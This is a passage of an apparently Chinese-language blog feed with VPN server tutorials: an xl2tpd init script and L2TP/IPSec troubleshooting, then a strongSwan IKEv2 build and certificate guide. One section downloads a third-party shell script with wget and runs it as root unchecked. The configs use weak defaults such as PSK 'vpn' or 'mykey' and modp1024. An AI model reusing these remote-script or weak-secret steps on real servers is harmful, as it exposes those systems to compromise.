<li><p><span class="com">#!/bin/sh</span><br>2.3.  <span class="com">#</span><br>4.5.  <span class="com"># xl2tpd This shell script takes care of starting and stopping l2tpd.</span><br>6.7.  <span class="com">#</span><br>8.9.  <span class="com"># chkconfig: - 80 30</span><br>10.11.  <span class="com"># description: Layer 2 Tunnelling Protocol Daemon (RFC 2661)</span><br>12.13.  <span class="com">#</span><br>14.15.  <span class="com"># processname: xl2tpd</span><br>16.17.  <span class="com"># config: /etc/xl2tpd/xl2tpd.conf</span><br>18.19.  <span class="com"># pidfile: /var/run/xl2tpd.pid</span><br>20.21.  <span class="com">#Servicename</span><br>22.23.  <span class="pln">SERVICE</span><span class="pun">=</span><span class="pln">xl2tpd</span><br>24.25.  <span class="com"># Source function library.</span><br>26.27.  <span class="pun">.</span> <span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">rc</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">init</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">functions</span><br>28.29.  <span class="com"># Source networking configuration.</span><br>30.31.  <span class="pun">.</span> <span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">sysconfig</span><span class="pun">/</span><span class="pln">network</span><br>32.33.  <span class="kwd">if</span> <span class="pun">[</span><span class="pln"> $</span><span class="pun">{</span><span class="pln">NETWORKING</span><span class="pun">}</span> <span class="pun">=</span> <span class="str">“no”</span> <span class="pun">]</span><br>34.35.  <span class="kwd">then</span><br>36.37.  <span class="kwd">exit</span> <span class="lit">0</span><br>38.39.  <span class="kwd">fi</span><br>40.41.  <span class="pun">[</span> <span class="pun">-</span><span class="pln">x </span><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="kwd">local</span><span class="pun">/</span><span class="pln">sbin</span><span class="pun">/</span><span class="pln">$SERVICE </span><span class="pun">]</span> <span class="pun">||</span> <span class="kwd">exit</span> <span class="lit">0</span><br>42.43.  <span class="pln">RETVAL</span><span class="pun">=</span><span class="lit">0</span><br>44.45.  <span class="pln">start</span><span class="pun">()</span> <span class="pun">{</span><br>46.47.  <span class="pln">echo </span><span class="pun">-</span><span class="pln">n </span><span class="str">“Starting $SERVICE: “</span><br>48.49.  <span class="kwd">if</span> <span class="pun">[</span> <span class="pun">!</span> <span class="pun">-</span><span class="pln">d </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="pln">run</span><span class="pun">/</span><span class="pln">xl2tpd </span><span class="pun">]</span><br>50.51.  <span class="kwd">then</span><br>52.53.  <span class="pln">mkdir </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="pln">run</span><span class="pun">/</span><span class="pln">xl2tpd</span><br>54.55.  <span class="kwd">fi</span><br>56.57.  <span class="pln">daemon </span><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="kwd">local</span><span class="pun">/</span><span class="pln">sbin</span><span class="pun">/</span><span class="pln">$SERVICE</span><br>58.59.  <span class="pln">RETVAL</span><span class="pun">=</span><span class="pln">$</span><span class="pun">?</span><br>60.61.  <span class="pun">[</span><span class="pln"> $RETVAL </span><span class="pun">-</span><span class="pln">eq </span><span class="lit">0</span> <span class="pun">]</span> <span class="pun">&amp;&amp;</span><span class="pln"> touch </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="kwd">lock</span><span class="pun">/</span><span class="pln">subsys</span><span class="pun">/</span><span class="pln">$SERVICE</span><br>62.63.  <span class="pln">echo </span><span class="str">“”</span><br>64.65.  <span class="kwd">return</span><span class="pln"> $RETVAL</span><br>66.67.  <span class="pun">}</span><br>68.69.  <span class="pln">stop</span><span class="pun">()</span> <span class="pun">{</span><br>70.71.  <span class="pln">echo </span><span class="pun">-</span><span class="pln">n </span><span class="str">“Stopping $SERVICE: “</span><br>72.73.  <span class="pln">killproc $SERVICE</span><br>74.75.  <span class="pln">RETVAL</span><span class="pun">=</span><span class="pln">$</span><span class="pun">?</span><br>76.77.  <span class="pln">echo</span><br>78.79.  <span class="pun">[</span><span class="pln"> $RETVAL </span><span class="pun">-</span><span class="pln">eq </span><span class="lit">0</span> <span class="pun">]</span> <span class="pun">&amp;&amp;</span><span class="pln"> rm </span><span class="pun">-</span><span class="pln">f </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="kwd">lock</span><span class="pun">/</span><span class="pln">subsys</span><span class="pun">/</span><span class="pln">$SERVICE</span><br>80.81.  <span class="kwd">return</span><span class="pln"> $RETVAL</span><br>82.83.  <span class="pun">}</span><br>84.85.  <span class="pln">restart</span><span class="pun">()</span> <span class="pun">{</span><br>86.87.  <span class="pln">stop</span><br>88.89.  <span class="pln">start</span><br>90.91.  <span class="pun">}</span><br>92.93.  <span class="com"># See how we were called.</span><br>94.95.  <span class="kwd">case</span> <span class="str">“$1”</span> <span class="kwd">in</span><br>96.97.  <span class="pln">start</span><span class="pun">)</span><br>98.99.  <span class="pln">start</span><br>100.101.  <span class="pun">;;</span><br>102.103.  <span class="pln">stop</span><span class="pun">)</span><br>104.105.  <span class="pln">stop</span><br>106.107.  <span class="pun">;;</span><br>108.109.  <span class="pln">status</span><span class="pun">)</span><br>110.111.  <span class="pln">status $SERVICE</span><br>112.113.  <span class="pln">RETVAL</span><span class="pun">=</span><span class="pln">$</span><span class="pun">?</span><br>114.115.  <span class="pun">;;</span><br>116.117.  <span class="pln">restart</span><span class="pun">|</span><span class="pln">reload</span><span class="pun">)</span><br>118.119.  <span class="pln">restart</span><br>120.121.  <span class="pun">;;</span><br>122.123.  <span class="pln">condrestart</span><span class="pun">)</span><br>124.125.  <span class="pun">[</span> <span class="pun">-</span><span class="pln">f </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="kwd">lock</span><span class="pun">/</span><span class="pln">subsys</span><span class="pun">/</span><span class="pln">$SERVICE </span><span class="pun">]</span> <span class="pun">&amp;&amp;</span><span class="pln"> restart </span><span class="pun">||</span> <span class="pun">:</span><br>126.127.  <span class="pun">;;</span><br>128.129.  <span class="pun">*)</span><br>130.131.  <span class="pln">echo </span><span class="str">“Usage: $SERVICE {start|stop|status|restart|reload|condrestart}”</span><br>132.133.  <span class="kwd">exit</span> <span class="lit">1</span><br>134.135.  <span class="kwd">esac</span><br>给它加上执行权限</p>
</li>
<li><p><span class="pln">chmod </span><span class="pun">+</span><span class="pln">x </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">init</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">xl2tpd</span><br>到这里就全部配置完成了 重启下几个服务</p>
</li>
<li><p><span class="pln">service iptables save</span></p>
</li>
<li><span class="pln">service iptables restart</span></li>
<li><span class="pln">service ipsec restart</span></li>
<li><span class="pln">service xl2tpd restart</span></li>
</ol>
<h2 id="xl2tp加入开机启动"><a href="#xl2tp加入开机启动" class="headerlink" title="xl2tp加入开机启动"></a>xl2tp加入开机启动</h2><ol>
<li><span class="pln">chkconfig </span><span class="pun">–</span><span class="pln">add xl2tpd</span><br><strong>下面是一键安装版本</strong></li>
</ol>
<h1 id="一键安装方法"><a href="#一键安装方法" class="headerlink" title="一键安装方法"></a>一键安装方法</h1><h2 id="下载脚本"><a href="#下载脚本" class="headerlink" title="下载脚本"></a>下载脚本</h2><p>CentOS Fedora或Redhat系统</p>
<ol>
<li><p><span class="pln">wget http</span><span class="pun">:</span><span class="com">//lamp.teddysun.com/files/l2tp.sh</span><br>Ubuntu系统</p>
</li>
<li><p><span class="pln">wget http</span><span class="pun">:</span><span class="com">//lamp.teddysun.com/files/l2tp_ubuntu.sh</span></p>
</li>
</ol>
<h2 id="赋予执行权限"><a href="#赋予执行权限" class="headerlink" title="赋予执行权限"></a>赋予执行权限</h2><ol>
<li><span class="pln">chmod </span><span class="pun">+</span><span class="pln">x </span><span class="pun">*.</span><span class="pln">sh</span></li>
</ol>
<h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>CentOS Fedora或Redhat系统</p>
<ol>
<li><p><span class="pun">./</span><span class="pln">l2tp</span><span class="pun">.</span><span class="pln">sh</span><br>Ubuntu系统</p>
</li>
<li><p><span class="pun">./</span><span class="pln">l2tp_ubuntu</span><span class="pun">.</span><span class="pln">sh</span><br>执行后会要求输入一些信息</p>
</li>
</ol>
<p>「Please input IP-Range:」表示输入IP段 默认为10.1.2 你可以输入10.0.0等自定义IP段</p>
<p>「Please input PSK:」表示输入PSK预共享密钥 自己输入一个即可 默认为vpn</p>
<p>确认无误后再次按回车开始安装 安装完成后会显示你的服务器IP 默认添加的账户密码和预共享密钥(PSK) 修改添加账户密码方法跟上面的一样</p>
<p>安装完如下图说明成功 可以使用了</p>
<p><a href="http://ww4.sinaimg.cn/large/81de4e80jw1eqbl8ejvu0j20gk06x75a.jpg" target="_blank" rel="external"><img src="http://ww4.sinaimg.cn/mw600/81de4e80jw1eqbl8ejvu0j20gk06x75a.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<h1 id="错误及解决方法"><a href="#错误及解决方法" class="headerlink" title="错误及解决方法"></a>错误及解决方法</h1><p>这里提供几个可能出现的错误及解决方法</p>
<h2 id="Pluto错误"><a href="#Pluto错误" class="headerlink" title="Pluto错误"></a>Pluto错误</h2><p>如果出现以下类似错误</p>
<ol>
<li><span class="typ">Checking</span><span class="pln"> that pluto </span><span class="kwd">is</span><span class="pln"> running </span><span class="pun">[</span><span class="pln">FAILED</span><span class="pun">]</span></li>
<li><span class="pln"> whack</span><span class="pun">:</span> <span class="typ">Pluto</span> <span class="kwd">is</span> <span class="kwd">not</span><span class="pln"> running </span><span class="pun">(</span><span class="kwd">no</span> <span class="str">“/var/run/pluto/pluto.ctl”</span><span class="pun">)</span><br>按照上面修改IPSec.conf的方法 把第一行的version 2.0加上去</li>
</ol>
<h2 id="iptable错误"><a href="#iptable错误" class="headerlink" title="iptable错误"></a>iptable错误</h2><ol>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Setting</span><span class="pln"> chains to policy ACCEPT</span><span class="pun">:</span><span class="pln"> security raw nat</span><span class="pun">[</span><span class="pln">FAILED</span><span class="pun">]</span><span class="pln">filter</span></li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Flushing</span><span class="pln"> firewall rules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span></li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Unloading</span><span class="pln"> modules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span></li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Applying</span><span class="pln"> firewall rules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span><br>这是Linode官方在iptables里加了一个security的规则链 但是centos不支持 解决方法如下</li>
</ol>
<p>修改iptables文件</p>
<ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">init</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">iptables</span><br>找到如下case段 在raw后面加上security)段如下</p>
</li>
<li><p><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> $tables</span><span class="pun">;</span> <span class="kwd">do</span></p>
</li>
<li><span class="pln"> echo </span><span class="pun">-</span><span class="pln">n </span><span class="str">“$i “</span></li>
<li><span class="kwd">case</span> <span class="str">“$i”</span> <span class="kwd">in</span></li>
<li><span class="pln"> raw</span><span class="pun">)</span></li>
<li><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t raw </span><span class="pun">-</span><span class="pln">P PREROUTING $policy \</span></li>
<li><span class="pun">&amp;&amp;</span><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t raw </span><span class="pun">-</span><span class="pln">P OUTPUT $policy \</span></li>
<li><span class="pun">||</span> <span class="kwd">let</span><span class="pln"> ret</span><span class="pun">+=</span><span class="lit">1</span></li>
<li><span class="pun">;;</span></li>
<li><span class="pln"> security</span><span class="pun">)</span></li>
<li><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P INPUT $policy \</span></li>
<li><span class="pun">&amp;&amp;</span><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P OUTPUT $policy \</span></li>
<li><span class="pun">&amp;&amp;</span><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P FORWARD $policy \</span></li>
<li><span class="pun">||</span> <span class="kwd">let</span><span class="pln"> ret</span><span class="pun">+=</span><span class="lit">1</span></li>
<li><span class="pun">;;</span></li>
<li><span class="pln"> filter</span><span class="pun">)</span></li>
<li><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P INPUT $policy \</span></li>
<li><span class="pun">&amp;&amp;</span><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P OUTPUT $policy \</span></li>
<li><span class="pun">&amp;&amp;</span><span class="pln"> $IPTABLES </span><span class="pun">-</span><span class="pln">t filter </span><span class="pun">-</span><span class="pln">P FORWARD $policy \</span></li>
<li><span class="pun">||</span> <span class="kwd">let</span><span class="pln"> ret</span><span class="pun">+=</span><span class="lit">1</span></li>
<li><p><span class="pun">;;</span><br>运行如下命令重启iptables</p>
</li>
<li><p><span class="pln">service iptables restart</span><br>看到如下所示表示成功</p>
</li>
<li><p><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Setting</span><span class="pln"> chains to policy ACCEPT</span><span class="pun">:</span><span class="pln"> security raw nat</span><span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span><span class="pln">filter</span></p>
</li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Flushing</span><span class="pln"> firewall rules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span></li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Unloading</span><span class="pln"> modules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span></li>
<li><span class="pln">iptables</span><span class="pun">:</span> <span class="typ">Applying</span><span class="pln"> firewall rules</span><span class="pun">:</span> <span class="pun">[</span><span class="pln"> OK </span><span class="pun">]</span></li>
</ol>
<h1 id="客户端设置"><a href="#客户端设置" class="headerlink" title="客户端设置"></a>客户端设置</h1><p>配置好以后看看如何使用</p>
<p>这里以WIN7为例 其他系统可以自行参考设置</p>
<p>1、打开网络和共享中心 点击设置新的连接和网络</p>
<p><a href="http://ww2.sinaimg.cn/large/81de4e80jw1eqblm2hod5j20gb07ndhh.jpg" target="_blank" rel="external"><img src="http://ww2.sinaimg.cn/mw600/81de4e80jw1eqblm2hod5j20gb07ndhh.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>2、选择连接到工作区并点击下一步</p>
<p><a href="http://ww4.sinaimg.cn/large/81de4e80jw1eqblo9ejdqj20hg0duwgr.jpg" target="_blank" rel="external"><img src="http://ww4.sinaimg.cn/mw600/81de4e80jw1eqblo9ejdqj20hg0duwgr.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>3、点击创建新连接并下一步</p>
<p><a href="http://ww2.sinaimg.cn/large/81de4e80jw1eqblpd8ti7j20hg0du75t.jpg" target="_blank" rel="external"><img src="http://ww2.sinaimg.cn/mw600/81de4e80jw1eqblpd8ti7j20hg0du75t.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>4、选择使用我的Internet连接</p>
<p><a href="http://ww3.sinaimg.cn/large/81de4e80jw1eqblqoj0j0j20hg0dujtg.jpg" target="_blank" rel="external"><img src="http://ww3.sinaimg.cn/mw600/81de4e80jw1eqblqoj0j0j20hg0dujtg.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>5、Internet地址填入你的服务器IP地址 目标名称随意 用来自己识别 填完后点击下一步</p>
<p><a href="http://ww2.sinaimg.cn/large/81de4e80jw1eqblsj840kj20hg0duq4y.jpg" target="_blank" rel="external"><img src="http://ww2.sinaimg.cn/mw600/81de4e80jw1eqblsj840kj20hg0duq4y.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>6、填入你设置的用户名和密码 勾选记住此密码 如果你想每次连接都要求输入密码可以不勾选 并点击创建 然后关闭</p>
<p><a href="http://ww3.sinaimg.cn/large/81de4e80jw1eqblucj5v7j20hg0du3zs.jpg" target="_blank" rel="external"><img src="http://ww3.sinaimg.cn/mw600/81de4e80jw1eqblucj5v7j20hg0du3zs.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>7、右键点击你刚才创建的链接 点击属性</p>
<p><a href="http://ww4.sinaimg.cn/large/81de4e80jw1eqblwfzhnaj207o04t0t0.jpg" target="_blank" rel="external"><img src="http://ww4.sinaimg.cn/mw600/81de4e80jw1eqblwfzhnaj207o04t0t0.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>8、切换到安全选项卡设置VPN类型为IPSec</p>
<p><a href="http://ww2.sinaimg.cn/large/81de4e80jw1eqblybfhsgj20ah0cgq4g.jpg" target="_blank" rel="external"><img src="http://ww2.sinaimg.cn/mw600/81de4e80jw1eqblybfhsgj20ah0cgq4g.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
<p>9、点击高级设置 选择使用预共享密钥作身份验证 并输入你刚才设置的预共享密钥(PSK) 一路确定设置完成 可以连接使用了</p>
<p><a href="http://ww1.sinaimg.cn/large/81de4e80jw1eqbm171ntgj20b907mwf8.jpg" target="_blank" rel="external"><img src="http://ww1.sinaimg.cn/mw600/81de4e80jw1eqbm171ntgj20b907mwf8.jpg" alt="L2TP+IPSec 配置方法 包括一键脚本" title="L2TP+IPSec 配置方法 包括一键脚本"></a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用Strongswan搭建IPSec/IKEv2 VPN]]></title>
      <url>http://www.linux52.com/2015-10-01-e4-bd-bf-e7-94-a8strongswan-e6-90-ad-e5-bb-baipsecikev2-vpn-2.html</url>
      <content type="html"><![CDATA[<p>本来Strongswan搭建IKEv2 VPN有一篇很好的教程（在nsshell.com上），但是貌似nsshell.com貌似挂了（反正我打不开），于是我就做个搬运，把教程拿过来。。正好原文中有一两处遗漏，我也好补上去。</p>
<p><strong>重要说明：本文原本只是给自己留一个参考，但似乎已经有很多人参考了这篇文章。一个月来我已经人工帮助了将近10个人无偿排查疑难问题。而作为一个学生，并没有多余的经历做这些事情。因此以后请不要找我问如何搭建VPN，谢谢。</strong></p>
<p>条件：<br>RAM大小合适的VPS或者服务器（96MB RAM就足够了，64MB RAM未测试）<br>可以是OpenVZ，但注意看教程中标注的针对OpenVZ的特殊步骤。</p>
<p>1.准备工作<br>请在虚拟机或服务器上安装好Ubuntu操作系统，32位、64位均可，建议14.04 LTS，并执行以下命令：</p>
<pre><code>apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; update
apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install libpam0g-dev libssl-dev make gcc
`&lt;/pre&gt;
将PAM库和SSL库安装在系统中

2.下载最新的strongswan源代码并编译
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;wget&lt;/span&gt; [&lt;span class=&quot;hljs-url&quot;&gt;http://download.strongswan.org/strongswan.tar.gz&lt;/span&gt;](http://download.strongswan.org/strongswan.tar.gz)
tar xzf strongswan.tar.gz
cd strongswan-*
`&lt;/pre&gt;
OpenVZ使用以下参数
&lt;pre class=&quot;  language-markup&quot;&gt;`./configure  --enable-eap-identity --enable-eap-md5 \
--enable-eap-mschapv2 --enable-eap-tls --enable-eap-ttls --enable-eap-peap  \
--enable-eap-tnc --enable-eap-&lt;span class=&quot;hljs-keyword&quot;&gt;dynamic&lt;/span&gt; --enable-eap-radius --enable-xauth-eap  \
--enable-xauth-pam  --enable-dhcp  --enable-openssl  --enable-addrblock --enable-unity  \
--enable-certexpire --enable-radattr --enable-tools --enable-openssl --disable-gmp --enable-kernel-libipsec
`&lt;/pre&gt;
其它服务器执行
&lt;pre class=&quot;  language-markup&quot;&gt;`./configure  --enable-eap-identity --enable-eap-md5 \
--enable-eap-mschapv2 --enable-eap-tls --enable-eap-ttls --enable-eap-peap  \
--enable-eap-tnc --enable-eap-&lt;span class=&quot;hljs-keyword&quot;&gt;dynamic&lt;/span&gt; --enable-eap-radius --enable-xauth-eap  \
--enable-xauth-pam  --enable-dhcp  --enable-openssl  --enable-addrblock --enable-unity  \
--enable-certexpire --enable-radattr --enable-tools --enable-openssl --disable-gmp
`&lt;/pre&gt;
等待这个过程结束后，执行以下命令：
&lt;pre class=&quot;  language-markup&quot;&gt;`make; make install
`&lt;/pre&gt;
耐心地等待编译，性能不同编译所需时间也有所不同。

完成后使用命令`ipsec version`检查是否出现版本号等信息，如下图
![](https://hjc.im/content/images/2014/11/Capture.PNG)
若出现`ipsec: command not found`则代表没有成功编译安装。

3.配置strongswan和证书

生成CA证书
生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; ca.pem  
`&lt;/pre&gt;
利用私钥，签名CA证书
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --self --in ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=VPN CA&quot;&lt;/span&gt; --ca --outform pem &amp;gt;ca.cert.pem
`&lt;/pre&gt;
服务器证书 生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; server.pem
`&lt;/pre&gt;
用CA证书签发服务器证书

首先确认访问服务器的IP地址或域名，连接时**不可使用其它地址，只能使用证书中的地址，请将下面一句命令中的123.123.123.123替换为自己服务器的IP地址或域名，连接时使用**，一共需要替换**两处**。
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --pub --in server.pem | ipsec pki --issue --cacert ca.cert.pem \
--cakey ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=123.123.123.123&quot;&lt;/span&gt; \
--san=&lt;span class=&quot;hljs-string&quot;&gt;&quot;123.123.123.123&quot;&lt;/span&gt; --flag serverAuth --flag ikeIntermediate \
--outform pem &amp;gt; server.cert.pem
`&lt;/pre&gt;
客户端证书 生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; client.pem
`&lt;/pre&gt;
利用CA签名客户端证书
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --pub --in client.pem | ipsec pki --issue --cacert ca.cert.pem --cakey ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=VPN Client&quot;&lt;/span&gt; --outform pem &amp;gt; client.cert.pem
`&lt;/pre&gt;
生成pkcs12证书
&lt;pre class=&quot;  language-markup&quot;&gt;`openssl pkcs12 -&lt;span class=&quot;hljs-keyword&quot;&gt;export&lt;/span&gt; -inkey client.pem -&lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; client.cert.pem -name &lt;span class=&quot;hljs-string&quot;&gt;&quot;client&quot;&lt;/span&gt; -certfile ca.cert.pem -caname &lt;span class=&quot;hljs-string&quot;&gt;&quot;VPN CA&quot;&lt;/span&gt;  -out client.cert.p12
`&lt;/pre&gt;
安装证书
&lt;pre class=&quot;  language-markup&quot;&gt;`cp -r ca.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/cacerts/
cp -r server.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/certs/
cp -r server.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/private/
cp -r client.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/certs/
cp -r client.pem  /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/private/
`&lt;/pre&gt;
证书安装完成，接下来配置strongswan，编辑`/usr/local/etc/ipsec.conf`
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;config&lt;/span&gt; setup
    uniqueids=never 

conn iOS_cert
    keyexchange=ikev1
    &lt;span class=&quot;hljs-comment&quot;&gt;# strongswan version &amp;gt;= 5.0.2, compatible with iOS 6.0,6.0.1&lt;/span&gt;
    fragmentation=&lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=pubkey
    rightauth2=xauth
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightcert=client.cert.pem
    auto=add

conn android_xauth_psk
    keyexchange=ikev1
    left=%defaultroute
    leftauth=psk
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    right=%any
    rightauth=psk
    rightauth2=xauth
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    auto=add

conn networkmanager-strongswan
    keyexchange=ikev2
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=pubkey
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightcert=client.cert.pem
    auto=add

conn windows7
    keyexchange=ikev2
    ike=aes256-sha1-modp1024! 
    rekey=&lt;span class=&quot;hljs-built_in&quot;&gt;no&lt;/span&gt;
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=eap-mschapv2
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightsendcert=never
    eap_identity=%any
    auto=add
`&lt;/pre&gt;
编辑`/usr/local/etc/strongswan.conf`
&lt;pre class=&quot;  language-markup&quot;&gt;` &lt;span class=&quot;hljs-title&quot;&gt;charon&lt;/span&gt; {
         &lt;span class=&quot;hljs-title&quot;&gt;load_modular&lt;/span&gt; = &lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
         duplicheck.enable = &lt;span class=&quot;hljs-built_in&quot;&gt;no&lt;/span&gt;
         compress = &lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
         plugins {
                 &lt;span class=&quot;hljs-title&quot;&gt;include&lt;/span&gt; strongswan.d/charon/&lt;span class=&quot;hljs-regexp&quot;&gt;*.conf&lt;/span&gt;
         }
         dns1 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.8.8&lt;/span&gt;
         dns2 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.4.4&lt;/span&gt;
         nbns1 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.8.8&lt;/span&gt;
         nbns2 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.4.4&lt;/span&gt;
 }
 include strongswan.d/&lt;span class=&quot;hljs-regexp&quot;&gt;*.conf&lt;/span&gt;
`&lt;/pre&gt;
编辑`/usr/local/etc/ipsec.secrets`中的用户名、密码
&lt;pre class=&quot;  language-markup&quot;&gt;`: RSA server.pem
: PSK &lt;span class=&quot;hljs-string&quot;&gt;&quot;mykey&quot;&lt;/span&gt;
: XAUTH &lt;span class=&quot;hljs-string&quot;&gt;&quot;mykey&quot;&lt;/span&gt;
[用户名] %any : EAP &lt;span class=&quot;hljs-string&quot;&gt;&quot;[密码]&quot;&lt;/span&gt;
`&lt;/pre&gt;
